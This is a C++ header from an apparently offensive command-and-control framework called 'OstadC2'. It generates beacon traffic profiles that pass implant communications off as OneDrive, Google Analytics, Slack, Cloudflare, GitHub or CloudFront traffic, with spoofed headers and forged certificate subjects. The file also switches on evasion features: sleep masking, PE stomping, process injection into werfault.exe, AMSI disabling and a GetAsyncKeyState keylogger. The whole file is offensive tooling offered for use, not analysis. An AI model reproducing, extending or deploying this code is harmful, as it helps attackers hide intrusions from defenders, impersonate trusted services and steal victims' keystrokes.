#pragma once

#include "MalleableModels.hpp"
#include <string>
#include <vector>
#include <random>

namespace OstadC2 {

class ProfileGenerator {
public:
    static Profile generate(
        const std::string& template_key = "amazon_cloudfront",
        uint32_t sleeptime = 5000,
        uint32_t jitter = 25,
        const std::string& evasion_level = "stealth", // "standard", "stealth", "paranoid"
        const std::string& custom_host = ""
    ) {
        Profile p;
        p.sleeptime = sleeptime;
        p.jitter = jitter;
        p.data_jitter = 15;

        std::mt19937 rng(std::random_device{}());

        // Wordlists & user agents
        std::vector<std::string> user_agents = {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.2420.81",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15"
        };
        p.useragent = user_agents[rng() % user_agents.size()];
        p.sample_name = "update_" + rand_hex(3) + ".exe";
        p.pipename = "msagent_##";
        p.pipename_stager = "status_" + rand_hex(2) + "##";

        std::string host = custom_host;
        std::string server_header = "CloudFront";
        std::vector<std::string> get_uris;
        std::vector<std::string> post_uris;
        std::string cookie_prefix = "session=";

        if (template_key == "microsoft_onedrive") {
            p.name = "Microsoft 365 & OneDrive Sync - " + evasion_level;
            if (host.empty()) host = "api.onedrive.live.com";
            server_header = "Microsoft-IIS/10.0";
            get_uris = {"/v1.0/drive/root/delta", "/v2.0/users/me/drive/items"};
            post_uris = {"/v1.0/drive/items/uploadSession", "/v2.0/telemetry/heartbeat"};
            cookie_prefix = "token=";
            p.https_cert.CN = "onedrive.live.com";
            p.https_cert.O = "Microsoft Corporation";
        } else if (template_key == "google_analytics") {
            p.name = "Google Analytics & Tag Manager - " + evasion_level;
            if (host.empty()) host = "www.google-analytics.com";
            server_header = "gws";
            get_uris = {"/g/collect", "/gtag/js"};
            post_uris = {"/g/collect/batch", "/analytics/v2/events"};
            cookie_prefix = "cid=";
            p.https_cert.CN = "google-analytics.com";
            p.https_cert.O = "Google LLC";
        } else if (template_key == "slack_api") {
            p.name = "Slack Enterprise Polling - " + evasion_level;
            if (host.empty()) host = "slack.com";
            server_header = "Apache";
            get_uris = {"/api/conversations.history", "/api/rtm.connect"};
            post_uris = {"/api/views.publish", "/api/chat.postMessage"};
            cookie_prefix = "channel=";
            p.https_cert.CN = "*.slack.com";
            p.https_cert.O = "Slack Technologies LLC";
        } else if (template_key == "cloudflare_cdn") {
            p.name = "Cloudflare Edge Workers - " + evasion_level;
            if (host.empty()) host = "workers.cloudflare.com";
            server_header = "cloudflare";
            get_uris = {"/cdn-cgi/trace", "/edge/v1/cache/sync"};
            post_uris = {"/cdn-cgi/beacon/performance", "/api/v4/graphql"};
            cookie_prefix = "cf_id=";
            p.https_cert.CN = "*.cloudflare.com";
            p.https_cert.O = "Cloudflare, Inc.";
        } else if (template_key == "github_api") {
            p.name = "GitHub REST API v3 - " + evasion_level;
            if (host.empty()) host = "api.github.com";
            server_header = "GitHub.com";
            get_uris = {"/repos/octocat/Hello-World/commits", "/meta"};
            post_uris = {"/repos/octocat/Hello-World/dispatches", "/collector/activity"};
            cookie_prefix = "auth=";
            p.https_cert.CN = "*.github.com";
            p.https_cert.O = "GitHub, Inc.";
        } else {
            // Default Amazon CloudFront
            p.name = "Amazon CloudFront CDN - " + evasion_level;
            if (host.empty()) host = "d1v8l4e9k0r2.cloudfront.net";
            server_header = "CloudFront";
            get_uris = {"/media/static/chunk_04.ts", "/api/cdn/v3/metrics/beacon.gif"};
            post_uris = {"/cf/v2/telemetry/report", "/analytics/event/collector"};
            cookie_prefix = "cf_id=";
            p.https_cert.CN = "*.cloudfront.net";
            p.https_cert.O = "Amazon.com, Inc.";
        }

        // Configure HTTP-GET
        p.http_get.verb = "GET";
        p.http_get.uris = get_uris;
        p.http_get.client.headers.push_back({"Host", host});
        p.http_get.client.headers.push_back({"Accept", "*/*"});
        p.http_get.client.headers.push_back({"Accept-Language", "en-US,en;q=0.9"});

        TransformBlock tb_meta;
        tb_meta.block_type = "metadata";
        tb_meta.transforms.push_back({"mask", ""});
        tb_meta.transforms.push_back({"base64url", ""});
        tb_meta.transforms.push_back({"prepend", cookie_prefix});
        tb_meta.termination = {"header", "Cookie"};
        tb_meta.has_termination = true;
        p.http_get.client.transform_blocks["metadata"] = tb_meta;

        p.http_get.server.headers.push_back({"Server", server_header});
        p.http_get.server.headers.push_back({"Content-Type", "application/json"});
        p.http_get.server.headers.push_back({"Cache-Control", "no-cache, no-store, must-revalidate"});
        TransformBlock tb_get_out;
        tb_get_out.block_type = "output";
        tb_get_out.transforms.push_back({"mask", ""});
        tb_get_out.transforms.push_back({"base64", ""});
        tb_get_out.termination = {"print", ""};
        tb_get_out.has_termination = true;
        p.http_get.server.output = tb_get_out;
        p.http_get.server.has_output = true;

        // Configure HTTP-POST
        p.http_post.verb = "POST";
        p.http_post.uris = post_uris;
        p.http_post.client.headers.push_back({"Host", host});
        p.http_post.client.headers.push_back({"Accept-Language", "en-US,en;q=0.9"});
        p.http_post.client.headers.push_back({"Content-Type", "application/json"});

        TransformBlock tb_id;
        tb_id.block_type = "id";
        tb_id.transforms.push_back({"mask", ""});
        tb_id.transforms.push_back({"base64url", ""});
        tb_id.termination = {"parameter", "token"};
        tb_id.has_termination = true;
        p.http_post.client.transform_blocks["id"] = tb_id;

        TransformBlock tb_post_out;
        tb_post_out.block_type = "output";
        tb_post_out.transforms.push_back({"mask", ""});
        tb_post_out.transforms.push_back({"base64url", ""});
        tb_post_out.termination = {"print", ""};
        tb_post_out.has_termination = true;
        p.http_post.client.transform_blocks["output"] = tb_post_out;

        p.http_post.server.headers.push_back({"Server", server_header});
        p.http_post.server.headers.push_back({"Content-Type", "application/json"});
        p.http_post.server.output = tb_get_out;
        p.http_post.server.has_output = true;

        // Configure Stage Evasion
        p.stage.cleanup = true;
        p.stage.sleep_mask = true;
        p.stage.smartinject = true;
        p.stage.stomppe = true;
        p.stage.obfuscate = true;
        p.stage.userwx = false; // RX enforced!
        p.stage.magic_mz_x86 = "MZ" + rand_hex(1);
        p.stage.magic_mz_x64 = "MZ" + rand_hex(1);
        p.stage.magic_pe = "P" + rand_hex(1);
        p.stage.transform_x86_prepend = "\\x90\\x90\\x90\\x90";
        p.stage.transform_x64_prepend = "\\x90\\x90\\x90\\x90";

        // Process Inject
        p.process_inject.allocator = (evasion_level == "paranoid") ? "NtMapViewOfSection" : "VirtualAllocEx";
        p.process_inject.min_alloc = 4096;
        p.process_inject.startrwx = false;
        p.process_inject.userwx = false;

        // Post-Ex
        p.post_ex.spawnto_x86 = "%windir%\\syswow64\\werfault.exe";
        p.post_ex.spawnto_x64 = "%windir%\\sysnative\\werfault.exe";
        p.post_ex.amsi_disable = true;
        p.post_ex.keylogger = "GetAsyncKeyState";

        return p;
    }

private:
    static std::string rand_hex(size_t len) {
        static const char hex_chars[] = "0123456789ABCDEF";
        std::mt19937 rng(std::random_device{}());
        std::string s;
        s.reserve(len * 2);
        for (size_t i = 0; i < len * 2; ++i) {
            s += hex_chars[rng() % 16];
        }
        return s;
    }
};

} // namespace OstadC2
